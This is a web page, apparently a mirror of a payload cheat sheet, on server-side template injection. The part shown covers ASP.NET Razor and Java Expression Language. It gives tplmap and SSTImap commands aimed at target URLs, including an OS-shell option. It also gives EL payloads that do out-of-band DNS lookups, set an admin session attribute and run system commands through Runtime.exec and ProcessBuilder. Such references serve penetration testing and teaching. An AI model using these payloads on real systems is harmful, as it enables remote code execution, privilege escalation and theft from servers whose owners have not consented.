    <a href="/docs/cve_exploits/tomcat-cve-2017-12617/" class="">Tomcat Cve 2017 12617</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/vbulletin-rce-5.0.0-5.5.4/" class="">V Bulletin Rce 5.0.0 5.5.4</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/weblogic-cve-2016-3510/" class="">Web Logic Cve 2016 3510</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/weblogic-cve-2017-10271/" class="">Web Logic Cve 2017 10271</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/weblogic-cve-2018-2894/" class="">Web Logic Cve 2018 2894</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/websphere-cve-2015-7450/" class="">Web Sphere Cve 2015 7450</a>
  

        </li>
      
    
  </ul>











  
<ul>
  
  <li>
    <a href="/posts/"  >
        Blog
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
        Contribute
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Server-Side Template Injection</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#server-side-template-injection">Server Side Template Injection</a>
      <ul>
        <li><a href="#summary">Summary</a></li>
        <li><a href="#tools">Tools</a></li>
        <li><a href="#methodology">Methodology</a></li>
        <li><a href="#aspnet-razor">ASP.NET Razor</a>
          <ul>
            <li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
            <li><a href="#aspnet-razor---command-execution">ASP.NET Razor - Command execution</a></li>
          </ul>
        </li>
        <li><a href="#expression-language-el">Expression Language EL</a>
          <ul>
            <li><a href="#expression-language-el---properties">Expression Language EL - Properties</a></li>
            <li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
            <li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
          </ul>
        </li>
        <li><a href="#freemarker">Freemarker</a>
          <ul>
            <li><a href="#freemarker---basic-injection">Freemarker - Basic injection</a></li>
            <li><a href="#freemarker---read-file">Freemarker - Read File</a></li>
            <li><a href="#freemarker---code-execution">Freemarker - Code execution</a></li>
            <li><a href="#freemarker---sandbox-bypass">Freemarker - Sandbox bypass</a></li>
          </ul>
        </li>
        <li><a href="#groovy">Groovy</a>
          <ul>
            <li><a href="#groovy---basic-injection">Groovy - Basic injection</a></li>
            <li><a href="#groovy---read-and-create-file">Groovy - Read and create File</a></li>
            <li><a href="#groovy---http-request">Groovy - HTTP request:</a></li>
            <li><a href="#groovy---command-execution">Groovy - Command Execution</a></li>
            <li><a href="#groovy---sandbox-bypass">Groovy - Sandbox Bypass</a></li>
          </ul>
        </li>
        <li><a href="#handlebars">Handlebars</a>
          <ul>
            <li><a href="#handlebars---command-execution">Handlebars - Command Execution</a></li>
          </ul>
        </li>
        <li><a href="#jade--codepen">Jade / Codepen</a></li>
        <li><a href="#java">Java</a>
          <ul>
            <li><a href="#java---basic-injection">Java - Basic injection</a></li>
            <li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
            <li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
          </ul>
        </li>
        <li><a href="#django-templates">Django Templates</a>
          <ul>
            <li><a href="#detection">Detection</a></li>
            <li><a href="#django-templates-for-post-exploitation">Django Templates for post-exploitation</a></li>
            <li><a href="#cross-site-scripting">Cross-site scripting</a></li>
            <li><a href="#debug-information-leak">Debug information leak</a></li>
            <li><a href="#leaking-apps-secret-key">Leaking app’s Secret Key</a></li>
            <li><a href="#admin-site-url-leak">Admin Site URL leak</a></li>
            <li><a href="#admin-username-and-password-hash-leak">Admin username and password hash leak</a></li>
          </ul>
        </li>
        <li><a href="#jinja2">Jinja2</a>
          <ul>
            <li><a href="#jinja2---basic-injection">Jinja2 - Basic injection</a></li>
            <li><a href="#jinja2---template-format">Jinja2 - Template format</a></li>
            <li><a href="#jinja2---debug-statement">Jinja2 - Debug Statement</a></li>
            <li><a href="#jinja2---dump-all-used-classes">Jinja2 - Dump all used classes</a></li>
            <li><a href="#jinja2---dump-all-config-variables">Jinja2 - Dump all config variables</a></li>
            <li><a href="#jinja2---write-into-remote-file">Jinja2 - Write into remote file</a></li>
            <li><a href="#jinja2---remote-code-execution">Jinja2 - Remote Code Execution</a></li>
            <li><a href="#jinja2---filter-bypass">Jinja2 - Filter bypass</a></li>
          </ul>
        </li>
        <li><a href="#jinjava">Jinjava</a>
          <ul>
            <li><a href="#jinjava---basic-injection">Jinjava - Basic injection</a></li>
            <li><a href="#jinjava---command-execution">Jinjava - Command execution</a></li>
          </ul>
        </li>
        <li><a href="#lessjs">Lessjs</a>
          <ul>
            <li><a href="#lessjs---ssrf--lfi">Lessjs - SSRF / LFI</a></li>
            <li><a href="#lessjs--v3---command-execution">Lessjs &lt; v3 - Command Execution</a></li>
            <li><a href="#plugins">Plugins</a></li>
          </ul>
        </li>
        <li><a href="#mako">Mako</a>
          <ul>
            <li><a href="#direct-access-to-os-from-templatenamespace">Direct access to os from TemplateNamespace:</a></li>
          </ul>
        </li>
        <li><a href="#pebble">Pebble</a>
          <ul>
            <li><a href="#pebble---basic-injection">Pebble - Basic injection</a></li>
            <li><a href="#pebble---code-execution">Pebble - Code execution</a></li>
          </ul>
        </li>
        <li><a href="#ruby">Ruby</a>
          <ul>
            <li><a href="#ruby---basic-injections">Ruby - Basic injections</a></li>
            <li><a href="#ruby---retrieve-etcpasswd">Ruby - Retrieve /etc/passwd</a></li>
            <li><a href="#ruby---list-files-and-directories">Ruby - List files and directories</a></li>
            <li><a href="#ruby---code-execution">Ruby - Code execution</a></li>
          </ul>
        </li>
        <li><a href="#smarty">Smarty</a></li>
        <li><a href="#twig">Twig</a>
          <ul>
            <li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
            <li><a href="#twig---template-format">Twig - Template format</a></li>
            <li><a href="#twig---arbitrary-file-reading">Twig - Arbitrary File Reading</a></li>
            <li><a href="#twig---code-execution">Twig - Code execution</a></li>
          </ul>
        </li>
        <li><a href="#java---velocity">Java - Velocity</a></li>
        <li><a href="#java---spring">Java - Spring</a></li>
        <li><a href="#pattemplate">patTemplate</a></li>
        <li><a href="#phplib-and-html_template_phplib">PHPlib and HTML_Template_PHPLIB</a></li>
        <li><a href="#plates">Plates</a></li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="server-side-template-injection">
  Server Side Template Injection
  <a class="anchor" href="#server-side-template-injection">#</a>
</h1>
<blockquote>
<p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
</blockquote>
<h2 id="summary">
  Summary
  <a class="anchor" href="#summary">#</a>
</h2>
<ul>
<li><a href="#templates-injections">Templates Injections</a>
<ul>
<li><a href="#summary">Summary</a></li>
<li><a href="#tools">Tools</a></li>
<li><a href="#methodology">Methodology</a></li>
<li><a href="#aspnet-razor">ASP.NET Razor</a>
<ul>
<li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
<li><a href="#aspnet-razor---command-execution">ASP.NET Razor - Command execution</a></li>
</ul>
</li>
<li><a href="#expression-language-el">Expression Language EL</a>
<ul>
<li><a href="#expression-language-el---basic-injection">Expression Language EL - Basic injection</a></li>
<li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
<li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
</ul>
</li>
<li><a href="#freemarker">Java - Freemarker</a>
<ul>
<li><a href="#freemarker---basic-injection">Freemarker - Basic injection</a></li>
<li><a href="#freemarker---read-file">Freemarker - Read File</a></li>
<li><a href="#freemarker---code-execution">Freemarker - Code execution</a></li>
<li><a href="#freemarker---sandbox-bypass">Freemarker - Sandbox bypass</a></li>
</ul>
</li>
<li><a href="#groovy">Groovy</a>
<ul>
<li><a href="#groovy---basic-injection">Groovy - Basic injection</a></li>
<li><a href="#groovy---read-and-create-file">Groovy - Read and create File</a></li>
<li><a href="#groovy---http-request">Groovy - HTTP request:</a></li>
<li><a href="#groovy---command-execution">Groovy - Command Execution</a></li>
<li><a href="#groovy---sandbox-bypass">Groovy - Sandbox Bypass</a></li>
</ul>
</li>
<li><a href="#handlebars">JavaScript - Handlebars</a>
<ul>
<li><a href="#handlebars---command-execution">Handlebars - Command Execution</a></li>
</ul>
</li>
<li><a href="#jade--codepen">Jade / Codepen</a></li>
<li><a href="#java">Java</a>
<ul>
<li><a href="#java---basic-injection">Java - Basic injection</a></li>
<li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
<li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
</ul>
</li>
<li><a href="#django-templates">Django Templates</a></li>
<li><a href="#jinja2">Python - Jinja2</a>
<ul>
<li><a href="#jinja2---basic-injection">Jinja2 - Basic injection</a></li>
<li><a href="#jinja2---template-format">Jinja2 - Template format</a></li>
<li><a href="#jinja2---debug-statement">Jinja2 - Debug Statement</a></li>
<li><a href="#jinja2---dump-all-used-classes">Jinja2 - Dump all used classes</a></li>
<li><a href="#jinja2---dump-all-config-variables">Jinja2 - Dump all config variables</a></li>
<li><a href="#jinja2---read-remote-file">Jinja2 - Read remote file</a></li>
<li><a href="#jinja2---write-into-remote-file">Jinja2 - Write into remote file</a></li>
<li><a href="#jinja2---remote-code-execution">Jinja2 - Remote Code Execution</a>
<ul>
<li><a href="#jinja2---forcing-output-on-blind-rce">Forcing output on blind RCE</a></li>
<li><a href="#exploit-the-ssti-by-calling-ospopenread">Exploit the SSTI by calling os.popen().read()</a></li>
<li><a href="#exploit-the-ssti-by-calling-subprocesspopen">Exploit the SSTI by calling subprocess.Popen</a></li>
<li><a href="#exploit-the-ssti-by-calling-popen-without-guessing-the-offset">Exploit the SSTI by calling Popen without guessing the offset</a></li>
<li><a href="#exploit-the-ssti-by-writing-an-evil-config-file">Exploit the SSTI by writing an evil config file.</a></li>
</ul>
</li>
<li><a href="#jinja2---filter-bypass">Jinja2 - Filter bypass</a></li>
</ul>
</li>
<li><a href="#jinjava">Java - Jinjava</a>
<ul>
<li><a href="#jinjava---basic-injection">Jinjava - Basic injection</a></li>
<li><a href="#jinjava---command-execution">Jinjava - Command execution</a></li>
</ul>
</li>
<li><a href="#lessjs">JavaScript - Lessjs</a>
<ul>
<li><a href="#lessjs---ssrf--lfi">Lessjs - SSRF / LFI</a></li>
<li><a href="#lessjs--v3---command-execution">Lessjs &lt; v3 - Command Execution</a></li>
<li><a href="#plugins">Plugins</a></li>
</ul>
</li>
<li><a href="#mako">Python - Mako</a>
<ul>
<li><a href="#direct-access-to-os-from-templatenamespace">Direct access to os from TemplateNamespace:</a></li>
</ul>
</li>
<li><a href="#pebble">Java - Pebble</a>
<ul>
<li><a href="#pebble---basic-injection">Pebble - Basic injection</a></li>
<li><a href="#pebble---code-execution">Pebble - Code execution</a></li>
</ul>
</li>
<li><a href="#ruby">Ruby</a>
<ul>
<li><a href="#ruby---basic-injections">Ruby - Basic injections</a></li>
<li><a href="#ruby---retrieve-etcpasswd">Ruby - Retrieve /etc/passwd</a></li>
<li><a href="#ruby---list-files-and-directories">Ruby - List files and directories</a></li>
<li><a href="#ruby---code-execution">Ruby - Code execution</a></li>
</ul>
</li>
<li><a href="#smarty">PHP - Smarty</a></li>
<li><a href="#twig">PHP - Twig</a>
<ul>
<li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
<li><a href="#twig---template-format">Twig - Template format</a></li>
<li><a href="#twig---arbitrary-file-reading">Twig - Arbitrary File Reading</a></li>
<li><a href="#twig---code-execution">Twig - Code execution</a></li>
</ul>
</li>
<li><a href="#java---velocity">Java - Velocity</a></li>
<li><a href="#java---spring">Java - Spring</a></li>
<li><a href="#pattemplate">PHP - patTemplate</a></li>
<li><a href="#phplib-and-html_template_phplib">PHP - PHPlib</a></li>
<li><a href="#plates">PHP - Plates</a></li>
<li><a href="#references">References</a></li>
</ul>
</li>
</ul>
<h2 id="tools">
  Tools
  <a class="anchor" href="#tools">#</a>
</h2>
<p>Recommended tools:</p>
<p><a href="https://github.com/epinna/tplmap">Tplmap</a> - Server-Side Template Injection and Code Injection Detection and Exploitation Tool</p>
<p>e.g:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python2<span style="color:#ae81ff">.7</span> <span style="color:#f92672">./</span>tplmap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#39;http://www.target.com/page?name=John*&#39;</span> <span style="color:#f92672">--</span>os<span style="color:#f92672">-</span>shell
</span></span><span style="display:flex;"><span>python2<span style="color:#ae81ff">.7</span> <span style="color:#f92672">./</span>tplmap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link&#34;</span>
</span></span><span style="display:flex;"><span>python2<span style="color:#ae81ff">.7</span> <span style="color:#f92672">./</span>tplmap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link&#34;</span> <span style="color:#f92672">--</span>level <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span>e jade
</span></span></code></pre></div><p><a href="https://github.com/vladko312/SSTImap">SSTImap</a> - Automatic SSTI detection tool with interactive interface based on <a href="https://github.com/epinna/tplmap">Tplmap</a></p>
<p>e.g:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">./</span>sstimap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#39;https://example.com/page?name=John&#39;</span> <span style="color:#f92672">-</span>s
</span></span><span style="display:flex;"><span>python3 <span style="color:#f92672">./</span>sstimap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#39;https://example.com/page?name=Vulnerable*&amp;message=My_message&#39;</span> <span style="color:#f92672">-</span>l <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span>e jade
</span></span><span style="display:flex;"><span>python3 <span style="color:#f92672">./</span>sstimap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>i <span style="color:#f92672">-</span>A <span style="color:#f92672">-</span>m POST <span style="color:#f92672">-</span>l <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span>H <span style="color:#e6db74">&#39;Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk&#39;</span>
</span></span></code></pre></div><h2 id="methodology">
  Methodology
  <a class="anchor" href="#methodology">#</a>
</h2>
<p><img src="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true" alt="SSTI cheatsheet workflow" /></p>
<hr>
<h2 id="aspnet-razor">
  ASP.NET Razor
  <a class="anchor" href="#aspnet-razor">#</a>
</h2>
<p><a href="https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c">Official website</a></p>
<blockquote>
<p>Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.</p>
</blockquote>
<h3 id="aspnet-razor---basic-injection">
  ASP.NET Razor - Basic injection
  <a class="anchor" href="#aspnet-razor---basic-injection">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>@(<span style="color:#ae81ff">1</span>+<span style="color:#ae81ff">2</span>)
</span></span></code></pre></div><h3 id="aspnet-razor---command-execution">
  ASP.NET Razor - Command execution
  <a class="anchor" href="#aspnet-razor---command-execution">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// C# code</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><hr>
<h2 id="expression-language-el">
  Expression Language EL
  <a class="anchor" href="#expression-language-el">#</a>
</h2>
<p><a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html">Official website</a></p>
<blockquote>
<p>Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0</p>
</blockquote>
<h3 id="expression-language-el---properties">
  Expression Language EL - Properties
  <a class="anchor" href="#expression-language-el---properties">#</a>
</h3>
<ul>
<li>Interesting properties to access <code>String</code>, <code>java.lang.Runtime</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>${<span style="color:#ae81ff">2</span>.class}
</span></span><span style="display:flex;"><span>${<span style="color:#ae81ff">2</span>.class.forName(<span style="color:#e6db74">&#34;java.lang.String&#34;</span>)}
</span></span><span style="display:flex;"><span>${<span style="color:#e6db74">&#39;&#39;</span>.getClass().forName(<span style="color:#e6db74">&#39;java.lang.Runtime&#39;</span>).getMethods()[<span style="color:#ae81ff">6</span>].toString()}
</span></span></code></pre></div><h3 id="expression-language-el---one-liner-injections-not-including-code-execution">
  Expression Language EL - One-Liner injections not including code execution
  <a class="anchor" href="#expression-language-el---one-liner-injections-not-including-code-execution">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// DNS Lookup
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.net.InetAddress&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getByName&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;xxxxxxxxxxxxxx.burpcollaborator.net&#34;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// JVM System Property Lookup (ex: java.class.path)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.System&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getProperty&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;java.class.path&#34;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Modify session attributes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>pageContext<span style="color:#f92672">.</span><span style="color:#a6e22e">request</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getSession</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">,</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)}</span>
</span></span></code></pre></div><h3 id="expression-language-el---code-execution">
  Expression Language EL - Code Execution
  <a class="anchor" href="#expression-language-el---code-execution">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// Common RCE payloads
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethod</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>getRuntime<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">,</span><span style="color:#66d9ef">null</span><span style="color:#f92672">).</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span><span style="color:#66d9ef">null</span><span style="color:#f92672">).</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(&lt;</span>COMMAND STRING<span style="color:#f92672">/</span>ARRAY<span style="color:#f92672">&gt;)</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ProcessBuilder</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredConstructors</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(&lt;</span>COMMAND ARRAY<span style="color:#f92672">/</span>LIST<span style="color:#f92672">&gt;).</span><span style="color:#a6e22e">start</span><span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using process builder
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.ArrayList&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">())}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cmd.exe&#34;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/k&#34;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ping x.x.x.x&#34;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.ProcessBuilder&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredConstructors</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">].</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">start</span><span style="color:#f92672">())}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using Reflection &amp; Invoke
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethods</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">6</span><span style="color:#f92672">].</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethods</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">6</span><span style="color:#f92672">].</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>whoami<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)}</span>
</span></span><span style="display:flex;"><span>
